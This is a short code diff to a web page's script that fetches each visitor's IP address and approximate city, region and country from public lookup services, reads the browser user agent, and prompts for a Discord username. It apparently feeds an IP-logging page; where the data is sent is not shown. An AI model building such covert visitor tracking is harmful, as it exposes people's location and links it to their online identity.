@@ -29,10 +29,14 @@
         // Function to get visitor's information
         const getVisitorInfo = async () => {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                const ip = data.ip;
-                const address = `${data.city}, ${data.region}, ${data.country_name}`;
+                const ipResponse = await fetch('https://api64.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                const addressResponse = await fetch('https://ipapi.co/json/');
+                const addressData = await addressResponse.json();
+                const address = `${addressData.city}, ${addressData.region}, ${addressData.country_name}`;
+
                 const username = prompt('Please enter your Discord username:');
                 const userAgent = navigator.userAgent;
 
@@ -42,7 +46,7 @@
                     console.error('Discord username not provided');
                 }
             } catch (error) {
-                console.error('Error fetching IP:', error);
+                console.error('Error fetching IP or address:', error);
             }
         };
 
